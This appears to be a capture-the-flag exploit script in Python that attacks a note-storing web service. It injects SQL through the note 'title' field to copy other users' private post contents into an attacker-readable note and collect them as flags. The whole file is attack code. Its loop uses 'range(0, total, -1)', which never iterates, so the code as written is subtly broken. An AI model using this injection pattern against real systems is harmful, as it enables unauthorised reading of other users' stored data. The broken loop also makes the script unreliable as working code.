#!/usr/bin/env python3
import requests
import json

class AttackError(Exception):
    pass
class ConnectError(Exception):
    pass

def attack(host: str, port: int) -> None:
    try:
        data = {
            'title': 'lol',
            'content': "lol",
            'public': False,
            'token': ''
        }

        try:
            r = requests.post(f"http://{host}:{port}/store", json=data)
        except:
            raise ConnectError("Posting first note to store")

        answer = json.loads(r.text)

        total = int(answer['data']['post_id'])
        flags = []

        for i in range(0, total, -1):
            i_s = str(i)
            data = {
                'title': f'pwned", (select content from posts where post_id={i_s} limit 0,1), "my_token");--',
                'content': "",
                'public': True,
                'token': ''
            }

            try:
                r = requests.post(f"http://{host}:{port}/store", json=data)
            except:
                raise ConnectError(f"Posting sploit for id {i}")

            answer = json.loads(r.text)

            data = {
                'post_id': answer['data']['post_id'],
                'token': "my_token",
            }

            try:
                r = requests.get(f"http://{host}:{port}/get", json=data)
            except:
                raise ConnectError(f"Getting flag with id {i}")

            answer = json.loads(r.text)
            if answer["data"]["title"] == "pwned":
                content = answer["data"]["content"]
                if content and content != "lol":
                    flags.append(content)
        print(flags)
        if len(flags) == 0:
            raise AttackError("Got no flags")
    except ConnectError:
        raise
    except AttackError:
        raise
    except Exception:
        import traceback
        traceback.print_exc()
        raise AttackError()

if __name__ == "__main__":
    import sys
    attack(sys.argv[1], 4001)
